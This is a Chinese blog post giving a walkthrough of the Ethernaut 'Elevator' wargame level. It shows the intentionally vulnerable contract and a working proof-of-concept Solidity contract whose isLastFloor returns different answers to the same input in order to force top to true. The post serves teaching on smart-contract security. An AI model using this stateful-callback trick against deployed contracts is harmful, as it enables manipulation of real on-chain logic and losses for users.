---
title: 'ethernaut.openzeppelin合约安全闯关-9'
date: 2022-12-11 19:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'

---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](G:\vue-press\hanxin-vuepress\docs\技术文章\区块链相关\assets\1670479273112.png)

:::

#### 第十一关Elevator  思路与POC

#### 目标: 将top变量设置为true

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);
   //这里是想让你实现isLastFloor(uint)函数,并能够在相同的输入的情况下返回两种不同的状态
    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

##### poc思路:point_right:：虽然这题看起来有点不知所以然,但是它实际想说明的是如果在没有view或者pure关键字修饰的情况下,你可以更改isLastFloor(_floor)函数返回的状态. 令其在相同的输入情况下返回true或者false

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorTest is Building {
  
  Elevator public ele = Elevator(0x805f317592037DF3f64ceb645f65dFcdA24298A1);
  bool public state = false ; //初始状态false
  //重写接口函数
  function isLastFloor(uint)  external  returns (bool){
    //第一次调用返回false 
    if(! state){
       state = true;
        return false;
     //第二次state的值更改所以返回true
    }else {
        return true;
      }
  }
  function BuildTest(uint floorT) public {
        ele.goTo(floorT);
  }
}
```

